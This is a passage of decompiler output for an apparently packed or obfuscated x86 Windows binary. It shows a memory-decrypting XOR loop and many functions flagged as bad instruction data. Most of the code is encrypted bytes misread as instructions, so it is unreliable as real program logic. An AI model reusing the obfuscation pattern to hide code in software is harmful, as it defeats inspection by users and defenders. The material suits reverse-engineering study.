      bVar34 = (char)(cVar9 - bVar22) < '\0';
      while (bVar35 == bVar34) {
        bVar6 = (byte)((uint)puVar18 >> 8);
        while( true ) {
          if (bVar6 != bVar22) {
            if (SBORROW1(bVar6,bVar22)) {
                    // WARNING: Bad instruction - Truncating control flow here
              halt_baddata();
            }
            do {
                    // WARNING: Do nothing block with infinite loop
            } while( true );
          }
          bVar35 = false;
          bVar6 = (byte)((uint)puVar18 >> 8) & bVar22;
          puVar18 = (uint *)((uint)bVar6 << 8);
          bVar34 = (short)((ushort)bVar6 << 8) < 0;
          if (!bVar34) break;
          if ((char)bVar22 <= (char)bVar6) {
                    // WARNING: Bad instruction - Truncating control flow here
            halt_baddata();
          }
        }
      }
    } while (bVar35 != bVar34);
  } while( true );
}



// WARNING: Control flow encountered bad instruction data
// WARNING: Instruction at (ram,0x0041b3e7) overlaps instruction at (ram,0x0041b3e6)
// 
// WARNING: Unable to track spacebase fully for stack
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined8 __fastcall FUN_0041ae65(uint param_1,int param_2)

{
  byte *pbVar1;
  uint *puVar2;
  undefined6 uVar3;
  undefined6 uVar4;
  uint uVar5;
  byte bVar6;
  char cVar7;
  char cVar8;
  char cVar9;
  int in_EAX;
  uint uVar10;
  uint uVar11;
  uint uVar12;
  undefined *puVar13;
  undefined3 uVar17;
  undefined3 uVar18;
  char *pcVar14;
  uint uVar15;
  undefined4 *puVar16;
  uint uVar19;
  int iVar20;
  uint *puVar21;
  uint uVar22;
  undefined uVar23;
  byte bVar25;
  uint unaff_EBX;
  uint uVar24;
  uint unaff_EBP;
  uint unaff_ESI;
  undefined4 *puVar26;
  undefined4 *puVar27;
  undefined *unaff_EDI;
  uint uVar28;
  undefined4 *puVar29;
  undefined2 in_ES;
  undefined2 uVar30;
  bool bVar31;
  bool bVar32;
  bool bVar33;
  uint unaff_retaddr;
  
  uVar19 = param_1 ^ 0x5374470;
  uVar10 = in_EAX - 1;
  puVar21 = (uint *)(param_2 + 0x57f);
  do {
    _DAT_00435290 = uVar19;
    *puVar21 = ~*puVar21;
    _DAT_004353bf = (unaff_ESI ^ uVar10) - uVar10;
    uVar22 = _DAT_004353bf + uVar10;
    _DAT_00435920 = _DAT_004353bf;
    s_Copyright__c__1992_2004_by_P_J__P_00436320._48_4_ = unaff_EDI;
    unique0x10000a84 = puVar21;
    *puVar21 = *puVar21 ^ 0xa3432f62;
    _DAT_0043575d = unaff_EBX >> 0x18 | unaff_EBX << 8;
    DAT_00435320 = unaff_EDI;
    _DAT_00435b50 = _DAT_0043575d;
    *puVar21 = *puVar21 + 0xa3432f62;
    _DAT_0043504c = ~unaff_EBX;
    _DAT_0043548d = puVar21;
    _DAT_00435570 = unaff_EDI;
    _DAT_00435876 = unaff_EDI;
    _DAT_00435960 = uVar19;
    unique0x10000a48 = uVar19;
    _DAT_00436293 = uVar19;
    _DAT_004367a7 = unaff_EBX;
    *puVar21 = ~*puVar21;
    PTR_u_dddd__MMMM_dd__yyyy_00435b00 = (undefined *)((uint)unaff_EDI ^ unaff_EBP ^ 0x113c0b62);
    *puVar21 = *puVar21 + 0x5cbcd09e;
    _DAT_00435585 = uVar19;
    PTR_u_Saturday_00435a90 = unaff_EDI;
    s_Copyright__c__1992_2004_by_P_J__P_00436320._87_4_ = uVar19;
    *puVar21 = *puVar21 ^ 0xa3432f62;
    _DAT_004369a6 = uVar19 ^ (uint)puVar21;
    _DAT_00436452 = uVar19;
    *puVar21 = *puVar21 + 0x5cbcd09e;
    _DAT_0043578c = (uint)(puVar21 + -0x504dea) ^ 0x71363b2;
    _DAT_00435676 = uVar19;
    _DAT_00436701 = uVar19;
    s___AVbad_alloc_std___00436818._2_4_ = unaff_EBX;
    *puVar21 = ~*puVar21;
    _DAT_0043509a = uVar19;
    _DAT_00435428 = uVar10;
    _DAT_00435b40 = uVar19;
    _DAT_004366c9 = uVar10;
    *puVar21 = *puVar21 ^ 0xa3432f62;
    _DAT_00435270 = -((uint)unaff_EDI >> 0x15 | (int)unaff_EDI << 0xb);
    *puVar21 = *puVar21 + 0x5cbcd09e;
    _DAT_00435be8 = unaff_EBX;
    _DAT_004366e3 = unaff_EDI;
    s___AVout_of_range_std___00436950._16_4_ = uVar19;
    *puVar21 = *puVar21 + 0x5cbcd09e;
    _DAT_004354c0 = ~uVar19;
    uVar28 = unaff_EBX << 0x10;
    _DAT_004354b4 = uVar28 >> 0x12 | (unaff_EBX >> 0x10 | uVar28) << 0xe;
    uVar15 = unaff_EBX & 0xffff0000;
    _DAT_00435152 = unaff_EBX;
    *puVar21 = ~*puVar21;
    uVar22 = ((uVar22 ^ uVar10) + uVar10 ^ uVar10) - uVar10;
    PTR_DAT_00435224 = (undefined *)(uVar22 ^ 0xe895174);
    unaff_EBX = unaff_EBX & 0x3f | uVar15 | (uVar28 & 0xffc00000) >> 0x10;
    puVar21 = puVar21 + 1;
    unaff_ESI = ((uVar22 + uVar10 ^ uVar10) - uVar10) - 4;
  } while (unaff_ESI != 0);
  uVar30 = SUB42(puVar21,0);
  uVar22 = in(uVar30);
  bVar32 = (unaff_retaddr & 0x400) != 0;
  uVar11 = uVar22 & 0xffffff00 | (uint)(byte)((char)uVar22 + 0xba);
  uVar10 = (uint)(byte)((char)(uVar28 >> 0x18) - 0x22);
  uVar28 = (uint)CONCAT11((char)(unaff_EDI + -0x29abeefc) + -8,(char)unaff_EBX);
  uVar24 = uVar15 | uVar28;
  uVar12 = (uint)(unaff_EDI + -0x29abeefc) & 0xffffff00 | 0xa4;
  _DAT_00435dd0 = uVar19;
  PTR_PTR_FUN_00436618 = unaff_EDI;
  do {
    puVar13 = (undefined *)(uVar10 & 0xffffff00 | (uint)(byte)((char)uVar10 + 0x78));
    uVar5 = uVar12 & 0xffffff00 | (uint)DAT_3bdecebe;
    puVar2 = (uint *)(puVar13 + uVar5 + 0x9d9390fc);
    uVar12 = (uint)(0xf < (byte)((char)uVar12 + 0x18U));
    uVar10 = *puVar2;
    bVar33 = CARRY4((uint)(puVar13 + *puVar2),uVar12);
    *puVar2 = (uint)(puVar13 + *puVar2 + uVar12);
    bVar31 = *puVar2 == 0;
    uVar23 = in(uVar30);
    *puVar13 = uVar23;
    bVar6 = (byte)((short)((short)register0x00000010 + 5) / (short)*(char *)(uVar24 - 0x5a));
    if (bVar31) {
      puVar21 = (uint *)(uVar19 + 0x8037a4f6);
      *puVar21 = *puVar21 << 1 | (uint)((int)*puVar21 < 0);
                    // WARNING: Bad instruction - Truncating control flow here
      halt_baddata();
    }
    bVar25 = (byte)(uVar28 >> 8);
    if ((!CARRY4(uVar10,(uint)puVar13) && !bVar33) && !bVar31) {
      if (!SBORROW1((char)((uint)puVar21 >> 8),bVar25)) {
        pbVar1 = (byte *)(uVar11 + uVar24 * 8);
        *pbVar1 = *pbVar1 << 7 | *pbVar1 >> 1;
        *(undefined4 *)(uVar11 + unaff_EBP) = 0xde04c515;
        pbVar1 = (byte *)(uVar11 + uVar24 * 8);
        *pbVar1 = *pbVar1 << 7 | *pbVar1 >> 1;
        uVar3 = *(undefined6 *)(uVar11 + uVar24 * 8);
        pbVar1 = (byte *)(uVar11 + uVar24 * 8);
        *pbVar1 = *pbVar1 << 5 | *pbVar1 >> 3;
        *(undefined4 *)(uVar19 + uVar24 * 8) = 0xde04c687;
        puVar21 = (uint *)((uint)uVar3 & 0xffffff00 | (uint)(byte)((char)uVar3 - 0x22));
        uVar28 = (uVar22 & 0xffffff00 | (uint)(byte)((char)uVar22 + 0x98)) + 4 + (uint)bVar32 * -8;
        puVar26 = (undefined4 *)
                  (((uint)register0x00000010 & 0xffff0000 | (uint)(bVar6 / 0xde) << 8 |
                   (uint)(byte)(bVar6 % 0xde - 0x27)) + 4 + (uint)bVar32 * -8);
        puVar26[uVar24 * 2] = 0xde04c60b;
        uVar10 = *puVar21;
        *puVar21 = uVar28 & 0xffffff00 | (uint)(byte)((char)uVar28 - 0x24);
        *(uint **)(uVar5 - 4) = puVar21;
        uVar10 = uVar10 + 0x45787de & 0xffffff00 | (uint)(byte)((char)(uVar10 + 0x45787de) - 0x22);
        puVar16 = puVar26 + uVar24 * 2;
        *(byte *)puVar16 = *(char *)puVar16 << 7 | *(byte *)puVar16 >> 1;
        *(undefined4 *)((int)puVar26 + unaff_EBP * 2) = 0x7e04c786;
        uVar3 = *(undefined6 *)((uVar5 - 4) + unaff_EBP * 4);
        cVar9 = (char)uVar3;
        iVar20 = (uint)CONCAT21((short)(uVar19 >> 0x10),(char)(uVar19 >> 8) - cVar9) << 8;
        uVar15 = uVar15 | CONCAT11(bVar25 + 8,(char)unaff_EBX);
        cVar9 = cVar9 + 'B';
        uVar17 = (int3)((uint6)uVar3 >> 8);
        do {
          do {
            cVar7 = cVar9;
            puVar26[uVar15 * 2] = 0xde04c787;
            cVar8 = (char)uVar10;
            out(0xc6,uVar10 & 0xffffff00 | (uint)(byte)(cVar8 + 0xbc));
            uVar23 = (undefined)uVar15;
            uVar19 = uVar15 & 0xffff0000;
            uVar3 = *(undefined6 *)(puVar26 + CONCAT31(uVar17,cVar7 + '\x12') * 2);
            uVar30 = (undefined2)((uint6)uVar3 >> 0x20);
            uVar28 = (uint)CONCAT11((char)uVar3,uVar23);
            uVar15 = uVar19 | uVar28;
            uVar18 = (undefined3)((uint6)uVar3 >> 8);
            uVar10 = CONCAT31(uVar17,cVar7 + -0x54);
            cVar9 = cVar8 + -0x10;
            uVar17 = uVar18;
          } while (cVar9 == '\0');
        } while (SCARRY1(cVar8 + -0x60,'P') != cVar9 < '\0');
        uVar10 = uVar19 | CONCAT11(cVar9,uVar23);
        pcVar14 = (char *)CONCAT31(uVar18,(char)(uVar28 >> 8) + 'P');
        *(undefined2 *)(uVar5 - 8) = in_ES;
        *(undefined *)(puVar26 + uVar10 * 2) = 0x97;
        puVar16 = puVar26 + uVar10 * 2;
        *(byte *)puVar16 = *(char *)puVar16 << 3 | *(byte *)puVar16 >> 5;
        puVar16 = puVar26 + uVar10 * 2;
        *(byte *)puVar16 = *(char *)puVar16 << 3 | *(byte *)puVar16 >> 5;
        *(undefined *)(puVar26 + uVar10 * 2) = 0x87;
        puVar26[uVar10 * 2] = 0xde04c787;
        uVar19 = uVar19 | CONCAT11((char)((uint)CONCAT11(cVar9,uVar23) >> 8) + -0x5c,uVar23);
        puVar29 = (undefined4 *)(pcVar14 + (uint)bVar32 * -2 + 1);
        *pcVar14 = cVar7 + 'j';
        puVar16 = puVar29 + (uint)bVar32 * -2 + 1;
        puVar27 = puVar26 + (uint)bVar32 * -2 + 1;
        *puVar29 = *puVar26;
        do {
          *(undefined2 *)(unaff_EBP - 0x3a) = uVar30;
          uVar3 = *(undefined6 *)(puVar27 + uVar19 * 2);
          uVar15 = (uint)uVar3;
          puVar26 = puVar27 + uVar15 * 2;
          *(byte *)puVar26 = *(char *)puVar26 << 7 | *(byte *)puVar26 >> 1;
          cVar9 = (char)*(undefined6 *)(puVar27 + uVar15 * 2);
          uVar10 = (uint)*(undefined6 *)(puVar27 + uVar15 * 2) & 0xffffff00;
          uVar23 = (undefined)uVar3;
          uVar15 = uVar15 & 0xffff0000;
          uVar19 = uVar15 | CONCAT11((char)puVar16 + -4,uVar23);
          uVar4 = *(undefined6 *)
                   (((uint)puVar16 & 0xffffff00 | (uint)(byte)((uint6)uVar3 >> 8)) + 100);
          in(0x78);
          *(char *)((int)puVar27 + -0x546dfb39) = *(char *)((int)puVar27 + -0x546dfb39) + '\x01';
          puVar16 = puVar27 + uVar19 * 2;
          *(byte *)puVar16 = *(char *)puVar16 << 7 | *(byte *)puVar16 >> 1;
          uVar3 = *(undefined6 *)(puVar27 + uVar19 * 2);
          uVar30 = (undefined2)((uint6)uVar3 >> 0x20);
          puVar27[uVar19 * 2] = 0xde04c51b;
          iVar20 = CONCAT31((int3)((uint)iVar20 >> 8),0x76);
          out(0xc6,uVar10 | (byte)(cVar9 + 0xb8));
          uVar10 = uVar10 | (byte)(cVar9 + 0x96) | (uint)puVar27;
          bVar6 = (byte)uVar10;
          uVar10 = uVar10 & 0xffffff00;
          unaff_EBP = unaff_EBP + (uVar10 | (byte)(bVar6 - 0x22)) + (uint)(0x21 < bVar6);
          puVar16 = (undefined4 *)(uVar10 | (byte)(bVar6 + 0x9a));
          bVar32 = 0xe1 < (byte)((char)uVar3 + 0xbcU);
          uVar10 = (uint)CONCAT11((char)uVar3 + -0x26,uVar23);
          uVar19 = uVar15 | uVar10;
          pcVar14 = (char *)(iVar20 + 0x78);
          cVar9 = *pcVar14;
          cVar7 = *pcVar14;
          *pcVar14 = cVar7 + '~' + bVar32;
        } while ((SCARRY1(cVar9,'~') != SCARRY1(cVar7 + '~',bVar32)) != *pcVar14 < '\0');
        cVar9 = (char)(uVar10 >> 8);
        uVar10 = ((uint)uVar3 & 0xffffff00 | (uint)(byte)(cVar9 + 0x9a)) + 0x87de04c5 +
                 (uint)(0x21 < (byte)(cVar9 + 0xbcU));
        puVar27[(uVar15 | CONCAT11(0xc0,uVar23)) * 2] = 0xde04c787;
        puVar27[(uVar15 | CONCAT11((char)((uint)CONCAT11(0xc0,uVar23) >> 8) + '$',uVar23)) * 2] =
             0xde04c787;
        return CONCAT44((int)uVar4,uVar10 & 0xffffff00 | (uint)(byte)((char)uVar10 + 0xbf));
      }
      in(uVar30);
                    // WARNING: Bad instruction - Truncating control flow here
      halt_baddata();
    }
    do {
    } while (CARRY4(uVar10,(uint)puVar13) || bVar33);
    uVar10 = (uint)((longlong)*(int *)(puVar13 + (uint)bVar32 * -2 + -0x40918689) * 0x1ae4686f);
    bVar6 = in(0xf1);
    uVar12 = (uint)register0x00000010 & 0xffff0000 |
             (uint)(ushort)((short)((short)register0x00000010 + 5) % (short)*(char *)(uVar24 - 0x5a)
                           << 8) | (uint)bVar6;
  } while ((longlong)(int)uVar10 ==
           (longlong)*(int *)(puVar13 + (uint)bVar32 * -2 + -0x40918689) * 0x1ae4686f && !bVar31);
  do {
    *(uint *)(unaff_EBP - 10) = *(uint *)(unaff_EBP - 10) ^ uVar12;
    do {
      cVar9 = (char)((uint)puVar21 >> 8);
      if (cVar9 < (char)bVar25) break;
      bVar33 = SBORROW1(cVar9,bVar25);
      bVar32 = (char)(cVar9 - bVar25) < '\0';
      while (bVar33 == bVar32) {
        bVar6 = (byte)((uint)puVar21 >> 8);
        while( true ) {
          if (bVar6 != bVar25) {
            if (!SBORROW1(bVar6,bVar25)) {
              do {
                    // WARNING: Do nothing block with infinite loop
              } while( true );
            }
                    // WARNING: Bad instruction - Truncating control flow here
            halt_baddata();
          }
          bVar33 = false;
          bVar6 = (byte)((uint)puVar21 >> 8) & bVar25;
          puVar21 = (uint *)((uint)bVar6 << 8);
          bVar32 = (short)((ushort)bVar6 << 8) < 0;
          if (!bVar32) break;
          if ((char)bVar25 <= (char)bVar6) {
                    // WARNING: Bad instruction - Truncating control flow here
            halt_baddata();
          }
        }
      }
    } while (bVar33 != bVar32);
  } while( true );
}



// WARNING: This function may have set the stack pointer
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0041ba7d(void)

{
  code *pcVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  char in_AF;
  
  pcVar1 = (code *)swi(0x82);
  _DAT_874b2ca4 = (*pcVar1)();
  _DAT_874b2ca4 = _DAT_874b2ca4 | 0xb86d449;
  pcVar1 = (code *)swi(0x6c);
  iVar2 = (*pcVar1)();
  uVar3 = iVar2 + 0x9c441aa7;
  do {
    uVar4 = uVar3 & 0xffffff00 | (uint)(byte)((byte)uVar3 - 4);
    uVar5 = uVar4 - 1;
    uVar3 = uVar5 & 0xffff0000 |
            (uint)CONCAT11(((int)uVar5 < 0) << 7 | (uVar5 == 0) << 6 | in_AF << 4 |
                           ((POPCOUNT(uVar5 & 0xff) & 1U) == 0) << 2 | 2U | (byte)uVar3 < 4,
                           (char)uVar5);
  } while (!SBORROW4(uVar4,1));
  return;
}



void FUN_0041baa4(void)

{
  return;
}



// WARNING: Control flow encountered bad instruction data
// WARNING: Instruction at (ram,0x0041bb8b) overlaps instruction at (ram,0x0041bb8a)
// 
// WARNING: Unable to track spacebase fully for stack
// WARNING: Removing unreachable block (ram,0x0041bb2e)

undefined * __fastcall FUN_0041bb00(uint param_1,int param_2,undefined4 *param_3)

{
  char *pcVar1;
  uint *puVar2;
  byte *pbVar3;
  undefined uVar4;
  undefined4 uVar5;
  char cVar6;
  byte bVar7;
  code *pcVar8;
  ulonglong uVar9;
  uint5 uVar10;
  byte bVar11;
  int in_EAX;
  uint uVar12;
  int iVar13;
  int extraout_ECX;
  uint uVar14;
  int *piVar15;
  byte bVar16;
  uint *puVar17;
  int unaff_EBP;
  int iVar18;
  char *unaff_ESI;
  int unaff_EDI;
  undefined *puVar19;
  bool bVar20;
  float10 in_ST0;
  float10 fVar21;
  undefined8 uVar22;
  uint unaff_retaddr;
  char in_stack_64ca55b0;
  undefined auStack256 [232];
  undefined auStack24 [4];
  
  uVar12 = param_1 & 0xffff0000 |
           (uint)CONCAT11((char)(param_1 >> 8) + *(char *)(param_2 + -0x1c),(char)param_1);
  fVar21 = (float10)*(short *)(unaff_retaddr + 0x57) / in_ST0;
  iVar13 = uVar12 - 1;
  pcVar1 = (char *)(param_2 + 0x53);
  cVar6 = *pcVar1;
  *pcVar1 = *pcVar1 >> 9;
  bVar20 = (cVar6 >> 8 & 1U) != 0;
  if (!bVar20) {
    *(int *)(param_2 + -0x6f76fb9c) = *(int *)(param_2 + -0x6f76fb9c) + 0x33;
    *(int *)(unaff_EBP + 0x62) = (int)ROUND(fVar21);
    puVar19 = (undefined *)(unaff_EDI - 1U | unaff_retaddr + 1);
    uVar4 = in((short)param_2);
    *puVar19 = uVar4;
    *(float10 *)(puVar19 + 0x7a5504c1) = fVar21;
    *(char *)(in_EAX + -0x6a) = *(char *)(in_EAX + -0x6a) >> 10;
    uVar12 = CONCAT11(*(char *)(param_2 + -0x2c) + -1,0xd3) | 0xffff0000;
    puVar2 = (uint *)(uVar12 + 0x12);
    *puVar2 = *puVar2 << 0x13 | *puVar2 >> 0xd;
    *(uint *)(uVar12 + 0xedb2efcd) = uVar12;
LAB_0041bb55:
    pcVar8 = (code *)swi(3);
    puVar19 = (undefined *)(*pcVar8)();
    return puVar19;
  }
  *(int *)param_2 = param_2;
  if (-1 < *pcVar1) {
    bVar11 = (byte)in_EAX;
    if ((char)bVar11 < '\0') goto LAB_0041bb55;
    pbVar3 = (byte *)(uVar12 - 0x11);
    bVar16 = (byte)(unaff_retaddr >> 8);
    bVar7 = bVar16 + *pbVar3;
    bVar20 = CARRY1(bVar16,*pbVar3) || CARRY1(bVar7,bVar11 < 0x89);
    unaff_retaddr = (uint)CONCAT11(bVar7 + (bVar11 < 0x89),(char)unaff_retaddr);
  }
  iVar18 = (unaff_EBP - *(int *)(param_2 + -0x5161bcd4)) - (uint)bVar20;
  *(int *)(*(int *)(&DAT_ffffffd8 + iVar13 * 4 + param_2) + -0x45) =
       *(int *)(*(int *)(&DAT_ffffffd8 + iVar13 * 4 + param_2) + -0x45) >> ((byte)iVar13 & 0x1f);
  pcVar8 = (code *)swi(0x5e);
  uVar22 = (*pcVar8)();
  iVar13 = (int)((ulonglong)uVar22 >> 0x20);
  uVar12 = (uint)uVar22 & 0xffffff00;
  bVar11 = (char)(unaff_retaddr - 1 >> 8) - 0x25;
  puVar19 = (undefined *)(uVar12 | bVar11);
  uVar14 = extraout_ECX - 1;
  if (uVar14 != 0 && bVar11 != 0) {
    iVar13 = CONCAT31((int3)((ulonglong)uVar22 >> 0x28),5);
    pcVar1 = (char *)(iVar18 + 0x521705a4 + iVar13 * 2);
    *pcVar1 = *pcVar1 + -1;
    uVar5 = in((short)iVar13);
    *param_3 = uVar5;
    return puVar19;
  }
  cVar6 = puVar19[-0x3f74a531];
  uVar12 = uVar12 | (byte)(cVar6 - 0x13);
  puVar2 = (uint *)(iVar13 + 0x6a);
  uVar10 = CONCAT14(0xf0 < (byte)(cVar6 - 0x22U),*puVar2);
  uVar9 = (ulonglong)uVar10 << 0x19;
  *puVar2 = (uint)(uVar10 >> 8) | (uint)uVar9;
  *(uint *)(uVar12 - 4) = uVar12;
  if ((uVar9 & 0x100000000) == 0) {
    cVar6 = *unaff_ESI;
    puVar17 = *(uint **)(uVar12 - 4);
    if (-1 < in_stack_64ca55b0) {
      piVar15 = (int *)(uVar14 + *(uint *)(extraout_ECX + -0x4d) + -1);
      pcRame6f38224 = unaff_ESI + 1;
      *piVar15 = (int)piVar15 + (uint)CARRY4(uVar14,*(uint *)(extraout_ECX + -0x4d)) + *piVar15;
      *(int *)((int)puVar17 + -1) = (int)puVar17 + 3;
      return (undefined *)((uint)auStack24 & 0xffff0000 | (uint)CONCAT11(99,cVar6));
    }
    *puVar17 = (uint)auStack256 | (uint)(byte)(cVar6 + 0x89);
    puVar17[-1] = uVar14;
    puVar17[-2] = iVar13;
    puVar17[-3] = 0xd383cd98;
    puVar17[-4] = (uint)(puVar17 + 1);
    puVar17[-5] = iVar18;
    puVar17[-6] = (uint)(unaff_ESI + 1);
    puVar17[-7] = (uint)param_3;
    puVar17[-8] = 0xffffffdc;
                    // WARNING: Bad instruction - Truncating control flow here
    halt_baddata();
  }
  return auStack24;
}



// WARNING: Control flow encountered bad instruction data
// WARNING: Unable to track spacebase fully for stack

undefined * __fastcall FUN_0041bb8c(int param_1,int param_2)

{
  uint *puVar1;
  char *pcVar2;
  undefined4 uVar3;
  char cVar4;
  code *pcVar5;
  ulonglong uVar6;
  uint5 uVar7;
  byte in_AL;
  byte bVar8;
  undefined *puVar9;
  uint uVar10;
  int extraout_ECX;
  uint uVar11;
  int *piVar12;
  int iVar13;
  uint unaff_EBX;
  uint *puVar15;
  int unaff_EBP;
  int iVar16;
  char *unaff_ESI;
  byte in_CF;
  bool in_SF;
  undefined8 uVar17;
  undefined4 *unaff_retaddr;
  char in_stack_64ca55ac;
  undefined auStack256 [228];
  undefined auStack28 [4];
  byte bVar14;
  
  if (!in_SF) {
    if ((char)in_AL < '\0') {
      pcVar5 = (code *)swi(3);
      puVar9 = (undefined *)(*pcVar5)();
      return puVar9;
    }
    bVar14 = (byte)(unaff_EBX >> 8);
    bVar8 = bVar14 + *(byte *)(param_1 + -0x10);
    in_CF = CARRY1(bVar14,*(byte *)(param_1 + -0x10)) || CARRY1(bVar8,in_AL < 0x89);
    unaff_EBX = (uint)CONCAT11(bVar8 + (in_AL < 0x89),(char)unaff_EBX);
  }
  iVar16 = (unaff_EBP - *(int *)(param_2 + -0x5161bcd4)) - (uint)in_CF;
  *(int *)(*(int *)(&DAT_ffffffd8 + param_1 * 4 + param_2) + -0x45) =
       *(int *)(*(int *)(&DAT_ffffffd8 + param_1 * 4 + param_2) + -0x45) >> ((byte)param_1 & 0x1f);
  pcVar5 = (code *)swi(0x5e);
  uVar17 = (*pcVar5)();
  iVar13 = (int)((ulonglong)uVar17 >> 0x20);
  uVar10 = (uint)uVar17 & 0xffffff00;
  bVar8 = (char)(unaff_EBX - 1 >> 8) - 0x25;
  puVar9 = (undefined *)(uVar10 | bVar8);
  uVar11 = extraout_ECX - 1;
  if (uVar11 != 0 && bVar8 != 0) {
    iVar13 = CONCAT31((int3)((ulonglong)uVar17 >> 0x28),5);
    pcVar2 = (char *)(iVar16 + 0x521705a4 + iVar13 * 2);
    *pcVar2 = *pcVar2 + -1;
    uVar3 = in((short)iVar13);
    *unaff_retaddr = uVar3;
    return puVar9;
  }
  cVar4 = puVar9[-0x3f74a531];
  uVar10 = uVar10 | (byte)(cVar4 - 0x13);
  puVar1 = (uint *)(iVar13 + 0x6a);
  uVar7 = CONCAT14(0xf0 < (byte)(cVar4 - 0x22U),*puVar1);
  uVar6 = (ulonglong)uVar7 << 0x19;
  *puVar1 = (uint)(uVar7 >> 8) | (uint)uVar6;
  *(uint *)(uVar10 - 4) = uVar10;
  if ((uVar6 & 0x100000000) != 0) {
    return auStack28;
  }
  cVar4 = *unaff_ESI;
  puVar15 = *(uint **)(uVar10 - 4);
  if (in_stack_64ca55ac < '\0') {
    *puVar15 = (uint)auStack256 | (uint)(byte)(cVar4 + 0x89);
    puVar15[-1] = uVar11;
    puVar15[-2] = iVar13;
    puVar15[-3] = 0xd383cd98;
    puVar15[-4] = (uint)(puVar15 + 1);
    puVar15[-5] = iVar16;
    puVar15[-6] = (uint)(unaff_ESI + 1);
    puVar15[-7] = (uint)unaff_retaddr;
    puVar15[-8] = 0xffffffdc;
                    // WARNING: Bad instruction - Truncating control flow here
    halt_baddata();
  }
  piVar12 = (int *)(uVar11 + *(uint *)(extraout_ECX + -0x4d) + -1);
  pcRame6f38224 = unaff_ESI + 1;
  *piVar12 = (int)piVar12 + (uint)CARRY4(uVar11,*(uint *)(extraout_ECX + -0x4d)) + *piVar12;
  *(int *)((int)puVar15 + -1) = (int)puVar15 + 3;
  return (undefined *)((uint)auStack28 & 0xffff0000 | (uint)CONCAT11(99,cVar4));
}



uint __fastcall FUN_0041bbfd(int param_1,int param_2)

{
  byte *pbVar1;
  byte bVar2;
  uint in_EAX;
  int unaff_EBX;
  int unaff_EBP;
  
  *(bool *)(param_2 + 0x1a4d1b81) = (*(byte *)(unaff_EBP + 4 + unaff_EBX * 8) & (byte)in_EAX) == 0;
  pbVar1 = (byte *)(param_1 * 2 + -0x57b6f327);
  bVar2 = *pbVar1;
  *pbVar1 = (byte)in_EAX;
  return in_EAX & 0xffffff00 | (uint)bVar2 | 0x55;
}



void FUN_0041bc92(void)

{
  uint in_EAX;
  uint uVar1;
  undefined2 in_FPUControlWord;
  undefined2 in_FPUStatusWord;
  undefined2 in_FPUTagWord;
  undefined2 in_FPULastInstructionOpcode;
  undefined4 in_FPUDataPointer;
  undefined4 in_FPUInstructionPointer;
  unkbyte10 in_ST0;
  unkbyte10 in_ST1;
  unkbyte10 in_ST2;
  unkbyte10 in_ST3;
  unkbyte10 in_ST4;
  unkbyte10 in_ST5;
  unkbyte10 in_ST6;
  unkbyte10 in_ST7;
  
  uVar1 = in_EAX & 0xffff0000 | (uint)CONCAT11(0x8a,(char)in_EAX);
  *(undefined2 *)(uVar1 + 0x6ab6eb57) = in_FPUControlWord;
  *(undefined2 *)(uVar1 + 0x6ab6eb5b) = in_FPUStatusWord;
  *(undefined2 *)(uVar1 + 0x6ab6eb5f) = in_FPUTagWord;
  *(undefined4 *)(uVar1 + 0x6ab6eb6b) = in_FPUDataPointer;
  *(undefined4 *)(uVar1 + 0x6ab6eb63) = in_FPUInstructionPointer;
  *(undefined2 *)(uVar1 + 0x6ab6eb69) = in_FPULastInstructionOpcode;
  *(unkbyte10 *)(uVar1 + 0x6ab6eb73) = in_ST0;
  *(unkbyte10 *)(uVar1 + 0x6ab6eb7d) = in_ST1;
  *(unkbyte10 *)(uVar1 + 0x6ab6eb87) = in_ST2;
  *(unkbyte10 *)(uVar1 + 0x6ab6eb91) = in_ST3;
  *(unkbyte10 *)(uVar1 + 0x6ab6eb9b) = in_ST4;
  *(unkbyte10 *)(uVar1 + 0x6ab6eba5) = in_ST5;
  *(unkbyte10 *)(uVar1 + 0x6ab6ebaf) = in_ST6;
  *(unkbyte10 *)(uVar1 + 0x6ab6ebb9) = in_ST7;
  return;
}



// WARNING: Control flow encountered bad instruction data
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0041bdec(void)

{
  code *pcVar1;
  undefined uVar2;
  uint in_EAX;
  uint *puVar3;
  uint *extraout_ECX;
  float10 fVar4;
  undefined6 uVar5;
  
  pcVar1 = (code *)swi(0x1c);
  fVar4 = (float10)(*pcVar1)();
  *(double *)(in_EAX + 0xba02cd) = (double)fVar4;
  uVar5 = (*_DAT_5d8ddb51)();
  puVar3 = (uint *)((uint)uVar5 | 0xb3a3dd5a);
  *puVar3 = in_EAX;
  _DAT_18c8cf98 = _DAT_18c8cf98 + (int)extraout_ECX;
  if (!SBORROW4(in_EAX ^ 0x4ee69d02,-0x38b4339b)) {
                    // WARNING: Bad instruction - Truncating control flow here
    halt_baddata();
  }
  uVar2 = *(undefined *)(((in_EAX ^ 0x4ee69d02) & 0xff) + 0x8d7f459d);
  *extraout_ECX = *extraout_ECX | (uint)(puVar3 + 1);
  out((short)((uint6)uVar5 >> 0x20),uVar2);
                    // WARNING: Bad instruction - Truncating control flow here
  halt_baddata();
}



// WARNING: Unable to track spacebase fully for stack
// WARNING: This function may have set the stack pointer
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0041be8c(void)

{
  int iVar1;
  uint uVar2;
  int extraout_ECX;
  uint *unaff_EBX;
  undefined *puVar3;
  uint unaff_EDI;
  undefined2 uVar4;
  byte in_CF;
  bool bVar5;
  
  uVar4 = 0x8805;
  iVar1 = func_0x9a5488cd();
  uVar2 = iVar1 + *(int *)(extraout_ECX + -0x39f594a8) + (uint)in_CF;
  bVar5 = (POPCOUNT((unaff_EDI | *unaff_EBX) & 0xff) & 1U) == 0;
  puVar3 = &DAT_def7dd42;
  _DAT_def7dd42 = 0x41bea5;
  _DAT_def7dd46 = uVar4;
  (*(code *)((uVar2 & 0xffffff00 | (uint)(byte)((char)uVar2 + 0x73)) - 0x3b))();
  if (!bVar5) {
    *(uint **)(puVar3 + -4) = unaff_EBX;
    return;
  }
  return;
}



int FUN_0041bff1(void)

{
  int in_EAX;
  
  return in_EAX + -0x17afb4aa;
}



int FUN_0041bff8(void)

{
  int in_EAX;
  
  return in_EAX + -0x17afb4aa;
}



// WARNING: Control flow encountered bad instruction data
// WARNING: Unable to track spacebase fully for stack

undefined8 __fastcall FUN_0041c067(int param_1,undefined2 param_2)

{
  undefined uVar1;
  int unaff_EBP;
  undefined *unaff_EDI;
  
